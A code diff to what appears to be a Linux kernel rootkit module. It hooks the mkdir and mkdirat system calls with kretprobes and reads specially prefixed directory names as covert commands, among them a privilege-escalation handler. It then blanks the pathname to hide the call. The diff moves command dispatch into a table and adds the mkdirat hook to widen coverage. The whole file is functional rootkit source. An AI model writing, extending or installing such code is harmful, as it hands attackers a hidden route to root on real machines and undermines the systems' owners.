@@ -108,12 +108,24 @@ static int rk_cmd_escalate(const char *arg)
 	return ret;
 }
 
+struct rk_cmd_entry {
+	const char *name;
+	int (*handler)(const char *arg);
+};
+
+static const struct rk_cmd_entry cmd_table[] = {
+	{ "e",      rk_cmd_escalate },
+	{ "ping",   rk_cmd_ping },
+	{ "status", rk_cmd_status },
+};
+
 static int rk_dispatch(const char *name)
 {
 	const char *suffix;
 	const char *dot;
 	const char *arg;
 	int cmd_len;
+	int i;
 
 	suffix = name + RK_PREFIX_LEN;
 
@@ -126,12 +138,12 @@ static int rk_dispatch(const char *name)
 		arg = NULL;
 	}
 
-	if (cmd_len == 1 && strncmp(suffix, "e", 1) == 0)
-		return rk_cmd_escalate(arg);
-	if (cmd_len == 4 && strncmp(suffix, "ping", 4) == 0)
-		return rk_cmd_ping(arg);
-	if (cmd_len == 6 && strncmp(suffix, "status", 6) == 0)
-		return rk_cmd_status(arg);
+	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
+		int nlen = strlen(cmd_table[i].name);
+
+		if (cmd_len == nlen && strncmp(suffix, cmd_table[i].name, nlen) == 0)
+			return cmd_table[i].handler(arg);
+	}
 
 	return -ENOENT;
 }
@@ -141,12 +153,10 @@ struct rk_mkdir_data {
 	bool intercepted;
 };
 
-static int rk_mkdir_entry(struct kretprobe_instance *inst,
-			  struct pt_regs *regs)
+static int rk_do_entry(struct kretprobe_instance *inst,
+		       const char __user *pathname)
 {
 	struct rk_mkdir_data *data;
-	struct pt_regs *uregs;
-	const char __user *pathname;
 	char buf[RK_PATH_MAX];
 	const char *base;
 	long copied;
@@ -154,11 +164,6 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	data = (struct rk_mkdir_data *)inst->data;
 	data->intercepted = false;
 
-	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
-	if (!uregs)
-		return 0;
-
-	pathname = (const char __user *)uregs->di;
 	copied = strncpy_from_user(buf, pathname, sizeof(buf));
 	if (copied <= 0)
 		return 0;
@@ -172,9 +177,32 @@ static int rk_mkdir_entry(struct kretprobe_instance *inst,
 	data->result = rk_dispatch(base);
 	data->intercepted = true;
 
-	// Nullify the pathname so the real mkdir sees an empty string
 	put_user('\0', (char __user *)pathname);
 	return 0;
+}
+
+/* mkdir(pathname, mode): pathname in di */
+static int rk_mkdir_entry(struct kretprobe_instance *inst,
+			  struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_do_entry(inst, (const char __user *)uregs->di);
+}
+
+/* mkdirat(dfd, pathname, mode): pathname in si */
+static int rk_mkdirat_entry(struct kretprobe_instance *inst,
+			    struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_do_entry(inst, (const char __user *)uregs->si);
 }
 
 static int rk_mkdir_return(struct kretprobe_instance *inst,
@@ -191,6 +219,14 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 static struct kretprobe rk_mkdir_probe = {
 	.kp.symbol_name = "__x64_sys_mkdir",
 	.entry_handler  = rk_mkdir_entry,
+	.handler        = rk_mkdir_return,
+	.data_size      = sizeof(struct rk_mkdir_data),
+	.maxactive      = 8,
+};
+
+static struct kretprobe rk_mkdirat_probe = {
+	.kp.symbol_name = "__x64_sys_mkdirat",
+	.entry_handler  = rk_mkdirat_entry,
 	.handler        = rk_mkdir_return,
 	.data_size      = sizeof(struct rk_mkdir_data),
 	.maxactive      = 8,
@@ -214,6 +250,11 @@ static int __init rk_init(void)
 	ret = register_kretprobe(&rk_mkdir_probe);
 	if (ret)
 		return ret;
+	ret = register_kretprobe(&rk_mkdirat_probe);
+	if (ret) {
+		unregister_kretprobe(&rk_mkdir_probe);
+		return ret;
+	}
 	proc_create_single("rklings", 0444, NULL, rk_proc_show);
 	return 0;
 }
@@ -221,6 +262,7 @@ static int __init rk_init(void)
 static void __exit rk_exit(void)
 {
 	remove_proc_entry("rklings", NULL);
+	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
 }
 
